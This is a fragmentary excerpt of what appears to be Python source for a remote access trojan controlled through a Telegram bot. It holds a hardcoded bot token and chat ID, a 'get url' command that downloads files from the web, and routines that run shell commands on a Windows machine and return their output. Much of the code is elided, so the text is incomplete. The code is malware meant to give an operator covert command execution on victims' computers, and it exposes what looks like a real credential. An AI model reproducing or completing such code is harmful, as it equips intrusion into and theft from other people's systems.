...
TOKEN = '7522743999:AAGNFUIhX6s3JtbXH0q6Pu1hoODl-AruK9g'   #change the token here
CHAT_ID = '7359548898'   #change the chat id here
...
get url             | Download File From URL (provide direct link)
        ...
        try:
            ...
            try:
                ...
                # Если UTF-8 не сработал, пробуем cp866 (кодировка cmd в русской Windows)
                return result.decode('cp866', errors='replace').strip()
        except subprocess.CalledProcessError as e:
            try:
                error_msg = e.output.decode('utf-8').strip()
            except UnicodeDecodeError:
                error_msg = e.output.decode('cp866', errors='replace').strip()
            return f"Command execution failed. Error: {error_msg}"
